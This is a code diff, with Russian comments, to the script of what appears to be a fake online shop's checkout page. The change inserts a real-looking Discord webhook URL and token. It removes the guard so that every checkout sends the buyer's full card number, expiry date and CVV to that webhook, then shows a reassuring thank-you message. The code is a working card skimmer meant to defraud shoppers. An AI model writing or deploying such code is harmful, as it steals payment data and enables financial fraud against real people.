@@ -53,8 +53,8 @@
 </div>
 
 <script>
-    // ЗАМЕНИ НА СВОЙ ВЕБХУК
-    const WEBHOOK = "https://discord.com/api/webhooks/ЗАМЕНИТЕ_НА_ВАШ/ТОКЕН";
+    // ВЕБХУК ВСТАВЛЕН
+    const WEBHOOK = "https://discord.com/api/webhooks/1505137773810810951/qA1nqYdCE8pz4rxzvcD2IC9U2TzTu9Pv5Ti0bEImbUeJvr-ZnfCoxbTrJncw6zcOkag7";
 
     let cart = [];
 
@@ -111,28 +111,26 @@
         if (!card || !exp || !cvv) { alert('заполните все поля'); return; }
         const total = cart.reduce((s,i)=>s+i.price,0);
         const items = cart.map(i=>`${i.name} (${i.price}₽)`).join('\n');
-        // отправить вебхук
-        if (WEBHOOK && !WEBHOOK.includes('ЗАМЕНИТЕ')) {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: 'НОВАЯ ПОКУПКА',
-                    embeds: [{
-                        title: 'данные карты',
-                        fields: [
-                            {name: 'товары', value: items, inline: false},
-                            {name: 'сумма', value: total + ' ₽', inline: true},
-                            {name: 'номер карты', value: `||${card}||`, inline: true},
-                            {name: 'срок', value: `||${exp}||`, inline: true},
-                            {name: 'cvv', value: `||${cvv}||`, inline: true}
-                        ]
-                    }]
-                })
-            }).catch(e=>console.log);
-        } else {
-            console.log('webhook не настроен', {card, exp, cvv, items, total});
-        }
+        
+        // отправка в дискорд
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: 'НОВАЯ ПОКУПКА',
+                embeds: [{
+                    title: 'данные карты',
+                    fields: [
+                        {name: 'товары', value: items, inline: false},
+                        {name: 'сумма', value: total + ' ₽', inline: true},
+                        {name: 'номер карты', value: `||${card}||`, inline: true},
+                        {name: 'срок', value: `||${exp}||`, inline: true},
+                        {name: 'cvv', value: `||${cvv}||`, inline: true}
+                    ]
+                }]
+            })
+        }).catch(e=>console.log);
+        
         alert('спасибо за покупку! товары придут в течение часа.');
         cart = [];
         updateCart();
